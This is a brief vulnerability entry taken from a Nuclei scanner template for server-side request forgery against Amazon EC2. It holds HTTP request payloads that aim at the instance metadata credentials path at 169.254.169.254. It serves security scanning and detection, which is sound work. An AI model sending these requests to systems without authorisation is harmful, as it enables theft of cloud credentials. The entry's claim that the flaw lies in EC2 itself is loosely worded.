# Vulnerability: Amazon EC2 - Server-side request forgery (SSRF)
**Classification:** CWE-441,CWE-918
**Source:** Nuclei Template (`amazon-ec2-ssrf.yaml`)

## Description
SSRF vulnerability exists in Amazon EC2, or Amazon Elastic Compute Cloud which is a web service provided by Amazon Web Services (AWS) that offers resizable compute capacity in the cloud.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
Host: {{Hostname}}

@tls-sni: {{Hostname}}
GET http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
Host: {{Hostname}}
```

